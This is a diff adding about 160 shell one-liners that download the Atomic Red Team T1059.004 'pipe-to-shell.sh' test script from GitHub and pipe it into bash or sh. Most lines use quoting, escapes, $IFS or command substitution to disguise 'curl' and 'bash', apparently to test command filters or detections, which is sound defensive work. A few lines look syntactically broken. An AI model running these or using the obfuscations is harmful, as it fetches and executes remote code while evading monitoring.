@@ -1,0 +1,301 @@
+cd /t""mp; c"u"rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba"sh"; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; $(printf c)u$(printf rl) -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba$'sh'; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t\mp; c$'url' -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b"a"sh; ls -la /t\mp/art.txt
+cd ${TMPDIR:-/t""mp}; `printf c`url -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba`printf sh`; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; cu$'rl' -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b${0##*/}ash; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; $(echo cu)rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba$(echo sh); ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$(printf u)rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$(printf a)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$((99/99))url -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba$((10/10))sh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; $(printf %s c)u$(printf %s rl) -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$(printf %s a)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c${IFS}url -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b${IFS}ash; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$'\x75'rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$'\x61'sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; $(echo c)$(echo u)rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | $(echo b)ash; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c"ur"l -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b"a"s"h"; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; cu"r"l -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba"s"h; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; $(printf cu)rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | $(printf ba)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$'u''rl' -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$'a''sh'; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$((1+0))url -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$((1+0))ash; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$(echo u)$(echo rl) -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$(echo a)$(echo sh); ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; $(printf %b c)u$(printf %b rl) -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$(printf %b a)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c${PATH%%:*}url -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba${PATH%%:*}sh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$IFSurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b${IFS}ash; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; cu$IFSrl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba$IFSsh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$(printf '\165')rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$(printf '\141')sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$'\u0075'rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$'\u0061'sh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$(echo -n u)rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$(echo -n a)sh; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c"u""rl" -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b"a""sh"; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; c$'ur''l' -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$'as''h'; ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c$(printf u)$(printf rl) -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$(printf a)$(printf sh); ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t""mp; $(echo cu)$(echo rl) -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | $(echo ba)$(echo sh); ls -la /t""mp/art.txt
+cd ${TMPDIR:-/t""mp}; c${IFS}u${IFS}rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b${IFS}a${IFS}sh; ls -la ${TMPDIR:-/t""mp}/art.txt
+cd /t"m"p; c"ur""l" -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba"sh"; ls -la /t"m"p/art.txt
+cd /tmp; c'u''r''l' -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b'a''s''h'; ls -la /tmp/art.txt
+cd /t\\mp; c"u""rl" -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b"a""sh"; ls -la /t\\mp/art.txt
+cd $(echo /tmp); c$(echo url) -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b$(echo ash); ls -la $(echo /tmp)/art.txt
+cd /t""mp; cu""rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b""ash; ls -la /t""mp/art.txt
+cd /tmp; c\u0075rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b\u0061sh; ls -la /tmp/art.txt
+cd /tmp; $(printf 'curl') -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | $(printf 'bash'); ls -la /tmp/art.txt
+cd /tmp; \curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | \bash; ls -la /tmp/art.txt
+cd /tmp; c\url -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b\ash; ls -la /tmp/art.txt
+cd /tmp; c${PWD##*/}url -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b${PWD##*/}ash; ls -la /tmp/art.txt
+cd /tmp; c\u0075rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b\u0061sh; ls -la /tmp/art.txt
+cd /tmp; `echo curl` -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | `echo bash`; ls -la /tmp/art.txt
+cd /tmp; curl --silent https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash --noprofile; ls -la /tmp/art.txt
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | command bash; ls -la /tmp/art.txt
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /bin/"bash"; ls -la /tmp/art.txt
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /bin/ba"sh"; ls -la /tmp/art.txt
+cd /tmp; c"u""rl" -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /b"in/bash"; ls -la /tmp/art.txt
+cd /tmp; /usr/bin/cu"rl" -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /usr/bin/ba"sh"; ls -la /tmp/art.txt
+cd /tmp; /usr/bin/c"ur"l -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /usr/bin/ba"sh"; ls -la /tmp/art.txt
+cd /tmp; cu\rl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ba\sh; ls -la /tmp/art.txt
+cd /tmp; cur\l -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bas\h; ls -la /tmp/art.txt
+cd /tmp; \c\u\r\l -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | \b\a\s\h; ls -la /tmp/art.txt
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh -c "bash"; ls -la /tmp/art.txt
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh$IFS-c$IFS"bash"; ls -la /tmp/art.txt
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh$'\x20'-c$'\x20'bash; ls -la /tmp/art.txt
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | s"h" -c 'ba"sh"'; ls -la /tmp/art.txt
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh -c 'ev'"al bash'; ls -la /tmp/art.txt
+cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh -c "e""val ba""sh"; ls -la /tmp/art.txt
+cd /tmp; c"$@"url -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | b"$@"ash; ls -la /tmp/art.txt
+cd /tmp; ${PATH:0:4}url -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | ${PATH:0:4}ash; ls -la /tmp/art.txt
+cd /tmp && curl --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --output art.txt https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name-all https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-header-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh --output art.txt && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -o art.txt https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --write-out '%{filename_effective}' --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -# --output art.txt https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -s --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --retry 2 --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -sSL --output art.txt https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --silent --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh --remote-name && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --compressed https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --no-buffer --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --fail --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --location --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -L --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --proto =https --tlsv1.2 --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --create-dirs https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --max-time 10 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --retry-delay 2 --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --keepalive-time 30 --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --limit-rate 100k --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --connect-timeout 5 --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --user-agent "Mozilla" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -s --output ./art.txt https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash ./art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -o ./art.txt https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && chmod +x ./art.txt && ./art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -Lo art.txt https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -fLo art.txt https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl -sLo art.txt https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --output-dir /tmp https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh && bash /tmp/art.txt && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --output https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name-all https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -J -L https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -sSL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --location --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --output-document - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --progress-bar --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --silent --location --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --compressed --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --http1.1 --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --tlsv1.3 --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --retry 3 --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --fail --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --create-dirs https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --output-dir . https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s --output - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -L --output - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -fsSL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -k --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name -L https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name -k https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name -sL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name -fL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --silent https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --location https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --remote-name --output - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -# --remote-name https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -L https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -fs https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -k https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -sSL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -# https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --location https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl --fail https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s --insecure https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
+cd /tmp && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash; ls /tmp/art.txt
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh
+bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)" && ls -la /tmp/art.txt
+bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"
+cd /tmp; bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"
+cd /tmp; sh -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"
+cd /tmp && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | .
+cd /tmp && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | source /dev/stdin
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | source /dev/stdin
+cd /tmp && bash < <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)
+bash < <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)
+cd /tmp && bash <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)
+cd /tmp; . <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | eval
+cd /tmp && eval "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | . /dev/stdin
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash -
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | env bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | command bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | nohup bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | setsid bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | exec bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash --norc
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash --noprofile
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash -s
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash -e
